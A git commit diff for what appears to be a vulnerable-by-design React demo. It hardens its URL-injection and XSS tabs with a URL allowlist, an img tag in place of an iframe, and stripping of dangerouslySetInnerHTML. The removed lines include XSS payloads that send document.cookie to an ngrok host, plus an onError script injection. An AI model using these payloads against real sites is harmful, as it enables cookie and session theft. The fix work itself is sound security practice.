12325e83f55bab378f29fabb69ff9b2ef7ed3ac3
Alejo Demitropulos <alejodemitropulos@Alejos-MacBook-Pro.local>
2024-03-14 10:09:57 -0300

    first

--- src/Tabs/URLInjection.js
+++ src/Tabs/URLInjection.js
@@ -1,28 +1,47 @@
-import React, { useState } from 'react'
-import { Input, Button } from 'reakit'
+import React, { useState } from "react";
+import { Input, Button } from "reakit";
 
 const URLInjection = () => {
+  const [value, setValue] = useState("");
+  const [submitted, setSubmitted] = useState(false);
+  const [isValidUrl, setIsValidUrl] = useState(true);
 
-  // https://9432-161-22-31-212.ngrok-free.app/images/document.cookie
-  const [value, setValue] = useState('')
-  const [submitted, setSubmitted] = useState(false)
+  const validateUrl = (url) => {
+    const isValid = url.startsWith("https://assets.pokemon.com/");
+    setIsValidUrl(isValid);
+    isValid ? setValue(url) && setSubmitted(true) : setSubmitted(false);
+  };
 
   return (
-    <div style={{margin: '8px 24px'}}>
+    <div style={{ margin: "8px 24px" }}>
       <h1>Insert your image</h1>
-      <form 
-          style={{width: '100%'}}
-          onSubmit={(e) => {
-            e.preventDefault()
-            setSubmitted(true)
-        }}>
-          <Input style={{width: '100%'}} onChange={e => setValue(e.target.value)}/>
-          <Button style={{width: '50%'}} onClick={() => setSubmitted(true)}>Submit</Button>
-        </form>
+      <form
+        style={{ width: "100%" }}
+        onSubmit={(e) => {
+          e.preventDefault();
+          setSubmitted(true);
+          validateUrl(e.target.elements.imageURL.value);
+        }}
+      >
+        <Input
+          name="imageURL"
+          style={{ width: "100%" }}
+          onChange={() => setIsValidUrl(true)}
+        />
+        {!isValidUrl && (
+          <p style={{ color: "red" }}>
+            Invalid image source. Only images from https://assets.pokemon.com/
+            are allowed.
+          </p>
+        )}
+        <Button type="submit" style={{ width: "50%" }}>
+          Submit
+        </Button>
+      </form>
 
-        {submitted && <iframe width={'90%'} height={'500px'} src={value}/>}
+      {submitted && <img width={"90%"} height={"500px"} src={value} />}
     </div>
-  )
-}
+  );
+};
 
 export default URLInjection;
--- src/Tabs/XssTab.js
+++ src/Tabs/XssTab.js
@@ -1,40 +1,68 @@
 import React, { useState } from "react";
-import { Input, Button } from 'reakit'
-
-// javascript:fetch('https://9432-161-22-31-212.ngrok-free.app/images/'+document.cookie, {method: "get", headers: new Headers({"ngrok-skip-browser-warning": "69420"})})
-// {"style":{ "backgroundColor": "red", "width": "100px", "height": "100px"}, "dangerouslySetInnerHTML": { "__html": "<img src='a.com' onError='{alert(1)}' />" }}
+import { Input, Button } from "reakit";
 
 export const XssTab = () => {
-  const [value, setValue] = useState('')
-  const [customizedBackground, setCustomizedBackground] = useState('{ "style": { "backgroundColor": "red", "width": "100px", "height": "100px"}}')
-  
-  const [backgroundProps, setBackgroundProps] = useState({})
-  const applyStyle = () => {
+  const [value, setValue] = useState("");
+  const [isValid, setIsValid] = useState(true); // New state to track validation status.
+  const [customizedBackground, setCustomizedBackground] = useState(
+    '{ "style": { "backgroundColor": "red", "width": "100px", "height": "100px"}}'
+  );
+  const validateUrl = (url) => /^(https?:\/\/).*/.test(url);
+
     
+  const [backgroundProps, setBackgroundProps] = useState({})
+  
+  const applyStyle = () => {
     try {
       const parsedJson = JSON.parse(customizedBackground);
+      if (parsedJson.hasOwnProperty('dangerouslySetInnerHTML')) {
+        console.warn('Found and removed dangerouslySetInnerHTML from input.');
+        delete parsedJson.dangerouslySetInnerHTML; 
+      }
+  
       setBackgroundProps(parsedJson);
     } catch (e) {
-      console.error(e)
-      setBackgroundProps(undefined)
+      console.error(e);
+      setBackgroundProps(undefined);
     }
-  }
-
+  };
   
+
+  const handleTestProfileLink = () => {
+    if (validateUrl(value)) {
+      window.open(value, "_blank");
+      setIsValid(true);
+    } else {
+      setIsValid(false);
+    }
+  };
+
   return (
-    <div style={{display: 'flex', flexDirection: 'column', alignItems: 'center'}}>
-
+    <div
+      style={{ display: "flex", flexDirection: "column", alignItems: "center" }}
+    >
       <h1>Set your profile link</h1>
-
-      <Input style={{width: '90%'}} value={value} onChange={(e) => setValue(e.target.value)}/>
-      <a href={value} >Test profile link</a>
+      <Input
+        style={{ width: "90%" }}
+        value={value}
+        onChange={(e) => setValue(e.target.value)}
+      />
+      <Button onClick={handleTestProfileLink}>Test profile link</Button>
+      {!isValid && (
+        <h4 style={{ color: "red" }}>
+          Invalid URL. URLs must start with http:// or https://
+        </h4>
+      )}
 
       <h1>Customize your profile background</h1>
-      <Input style={{width: '90%'}} value={customizedBackground} onChange={(e) => setCustomizedBackground(e.target.value)}/>
+      <Input
+        style={{ width: "90%" }}
+        value={customizedBackground}
+        onChange={(e) => setCustomizedBackground(e.target.value)}
+      />
       <Button onClick={applyStyle}>Apply</Button>
       {!backgroundProps && <h4>Error setting styles</h4>}
       <div {...backgroundProps}></div>
-
     </div>
-  )
-}
+  );
+};
